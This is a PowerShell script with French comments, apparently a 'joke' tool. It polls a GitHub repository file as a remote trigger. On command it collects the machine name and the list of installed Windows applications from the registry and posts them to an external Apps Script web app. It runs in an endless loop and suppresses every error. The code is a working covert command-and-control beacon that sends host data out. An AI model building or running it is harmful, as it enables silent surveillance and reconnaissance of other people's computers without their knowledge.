# blague_apps_windows.ps1
# Surveille GitHub. Quand get_apps=true -> liste les apps installees -> envoie au Apps Script.

$ConfigFile = Join-Path $PSScriptRoot "blague_config.json"
$config     = Get-Content $ConfigFile -Raw | ConvertFrom-Json

$headers = @{
    Authorization = "Bearer $($config.token)"
    Accept        = "application/vnd.github+json"
    "User-Agent"  = "PowerShell"
}

function Get-AppsSignal {
    try {
        $url  = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_apps.json?ref=$($config.branch)"
        $resp = Invoke-RestMethod -Uri $url -Headers $headers -ErrorAction Stop
        $json = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($resp.content -replace "\s","")))
        $data = $json | ConvertFrom-Json
        return @{ get_apps = [bool]$data.get_apps; sha = $resp.sha }
    } catch { return $null }
}

function Reset-AppsSignal($sha) {
    try {
        $body = @{
            message = "reset apps signal"
            content = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"get_apps":false}'))
            sha     = $sha
            branch  = $config.branch
        } | ConvertTo-Json
        $url = "https://api.github.com/repos/$($config.owner)/$($config.repo)/contents/data/blague_apps.json"
        Invoke-RestMethod -Uri $url -Method Put -Headers $headers -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

function Get-InstalledApps {
    $apps = @()

    # Registre 64 bits
    $paths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )

    foreach ($path in $paths) {
        try {
            Get-ItemProperty $path -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName -and $_.DisplayName.Trim() -ne '' } |
            ForEach-Object {
                $apps += [PSCustomObject]@{
                    nom        = $_.DisplayName.Trim()
                    version    = if ($_.DisplayVersion) { $_.DisplayVersion } else { '' }
                    editeur    = if ($_.Publisher)      { $_.Publisher }      else { '' }
                    installe   = if ($_.InstallDate)    { $_.InstallDate }    else { '' }
                }
            }
        } catch {}
    }

    # Deduplication par nom + version
    $apps = $apps | Sort-Object nom | Group-Object { "$($_.nom)|$($_.version)" } | ForEach-Object { $_.Group[0] }

    return $apps
}

function Send-Apps {
    $apps = Get-InstalledApps

    $body = @{
        type    = 'apps'
        machine = $env:COMPUTERNAME
        date    = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
        apps    = @($apps)
    } | ConvertTo-Json -Depth 5 -Compress

    try {
        Invoke-RestMethod -Uri $config.webapp_url -Method Post -Body $body -ContentType "application/json" | Out-Null
    } catch {}
}

# Boucle principale
while ($true) {
    $signal = Get-AppsSignal
    if ($signal -and $signal.get_apps) {
        Reset-AppsSignal $signal.sha
        Send-Apps
    }
    Start-Sleep -Seconds 3
}
